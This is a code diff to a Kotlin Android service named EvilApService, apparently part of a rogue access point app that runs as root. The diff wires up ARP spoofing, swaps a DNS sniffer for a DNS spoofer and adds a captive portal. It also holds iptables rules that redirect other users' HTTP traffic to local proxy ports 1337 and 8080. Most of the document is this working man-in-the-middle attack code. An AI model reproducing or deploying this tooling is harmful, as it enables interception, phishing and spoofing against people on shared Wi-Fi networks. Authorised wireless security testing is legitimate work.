@@ -10,6 +10,7 @@ import android.os.Build
 import android.os.IBinder
 import android.util.Log
 import android.widget.Toast
+import com.nibiru.evilap.proxy.SharedClass
 import eu.chainfire.libsuperuser.Shell
 import io.reactivex.disposables.Disposable
 import java.io.Serializable
@@ -24,7 +25,7 @@ class EvilApService: Service() {
     private val NOTIFICATION_CHANNEL_ID = "evilap_notification_channel"
     private val ARPSPOOF = "/lib/libarpspoof.so"
     private val SCAN = "/lib/libscanner.so"
-    private val DNSSNIFF = "/lib/libdnssniff.so"
+    private val DNSSPOOF = "/lib/libdnsspoof.so"
     enum class service(val action: String) {
         ACTION_STOP_SERVICE("com.nibiru.evilap.service_stop"),
         ACTION_SCAN_ACTIVE("com.nibiru.evilap.service_scan_active"),
@@ -56,6 +57,9 @@ class EvilApService: Service() {
             service.ACTION_STOP_SERVICE.action -> exit()
         }
         setupEventBus()
+        val manager = super.getSystemService(Context.WIFI_SERVICE) as WifiManager
+        myIp = int2ip(manager.dhcpInfo.ipAddress)
+        gateway = int2ip(manager.dhcpInfo.gateway)
         // If this service really do get killed, there is no point restarting it automatically
         return Service.START_NOT_STICKY
     }
@@ -69,30 +73,19 @@ class EvilApService: Service() {
                 is EventActiveScan -> {
                     nativeActiveScan("wlan0")
                 } //TODO: check wifi connectivity
-                is EventArpSpoof -> {
-                    nativeArpSpoof(it.state)
-                }
-                is EventHttpProxy -> {
-                    lateinit var cmds: List<String>
-                    if(it.state)
-                        cmds = listOf(
-                                "iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337",
-                                "ip6tables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337")
-                    else
-                        cmds = listOf(
-                                "iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337",
-                                "ip6tables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337")
-                    getIdleShell().addCommand(cmds)
-                }
+                is EventArpSpoof -> { nativeArpSpoof(it.state) }
+                is EventHttpProxy -> { nativeHttpProxy(it.state) }
                 is EventHostChecked -> {
                     if(it.h.present)
                         mCheckedHosts.add(it.h)
                     else
                         mCheckedHosts.removeAt(mCheckedHosts.indexOfFirst { el: Host -> it.h.mac == el.mac })
                 }
+                is EventCaptivePortal -> { nativeCaptivePortal(it.state) }
             }
         })
     }
+
 
     private fun buildNotification(): Notification {
         val notifyIntent = Intent(this, MainActivity::class.java)
@@ -143,6 +136,7 @@ class EvilApService: Service() {
         RxEventBus.INSTANCE.send2BackEnd(EventExit())
         getIdleShell().addCommand(listOf("pkill -f ${applicationInfo.dataDir}/lib/"))
         nativeArpSpoof(false)
+        nativeCaptivePortal(false)
         for (shell in mShells)
             shell.close()
         stopSelf()
@@ -185,9 +179,6 @@ class EvilApService: Service() {
                 return@addCommand
             }
             mScannedHosts.clear()
-            val manager = super.getSystemService(Context.WIFI_SERVICE) as WifiManager
-            myIp = int2ip(manager.dhcpInfo.ipAddress)
-            gateway = int2ip(manager.dhcpInfo.gateway)
 
             val cmd = "LD_LIBRARY_PATH=$path/lib/ $path$SCAN wlan0 active-arp"
             getIdleShell().addCommand(cmd, 0, object : Shell.OnCommandLineListener {
@@ -207,25 +198,6 @@ class EvilApService: Service() {
                 }
             })
         }
-    }
-
-    private fun nativeDnsSniff(iface: String) {
-        val whitelist = listOf("wlan0")
-        if(!whitelist.contains(iface)){
-            Log.e(TAG, "nativeDnsSniff: bad interface!")
-            return
-        }
-        val shell = getIdleShell()
-        val path = applicationInfo.dataDir
-        val cmd = "LD_LIBRARY_PATH=$path/lib/$DNSSNIFF $path $iface"
-        shell.addCommand(cmd, 0, object : Shell.OnCommandLineListener {
-            override fun onCommandResult(commandCode: Int, exitCode: Int) {
-                Log.i("ROOT", "$cmd \n(exit code: $exitCode)")
-            }
-            override fun onLine(line: String) {
-                Log.d("ROOT", line)
-            }
-        })
     }
 
     private fun nativeArpSpoof(spoofing: Boolean){
@@ -272,6 +244,34 @@ class EvilApService: Service() {
         }
     }
 
+    private fun nativeHttpProxy(state: Boolean) {
+        val cmds: List<String>
+        if(state)
+            cmds = listOf(
+                    "iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337",
+                    "ip6tables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337")
+        else
+            cmds = listOf(
+                    "iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337",
+                    "ip6tables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337")
+        getIdleShell().addCommand(cmds)
+    }
+
+    private fun nativeCaptivePortal(state: Boolean) {
+        if(state) {
+            val path = applicationInfo.dataDir
+            val cmds = listOf(
+                    "iptables -t nat -I PREROUTING -p tcp -d $myIp --dport 80 -j REDIRECT --to-port 8080",
+                    "LD_LIBRARY_PATH=$path/lib/ $path$DNSSPOOF wlan0")
+            getIdleShell().addCommand(cmds)
+        }
+        else {
+            val cmds = listOf(
+                    "iptables -t nat -D PREROUTING -p tcp -d $myIp --dport 80 -j REDIRECT --to-port 8080")
+            getIdleShell().addCommand(cmds)
+        }
+    }
+
     private fun int2ip(int: Int): String{
         val myIPAddress = BigInteger.valueOf(int.toLong()).toByteArray()
         myIPAddress.reverse()
@@ -286,6 +286,7 @@ class EvilApService: Service() {
     data class EventActiveScan(val type: String)
     data class EventArpSpoof(val state: Boolean)
     data class EventHttpProxy(val state: Boolean)
+    data class EventCaptivePortal(val state: Boolean)
     data class EventHostChecked(val h: Host)
     // Front end events
     data class EventScannedHosts(val hosts: List<Host>)
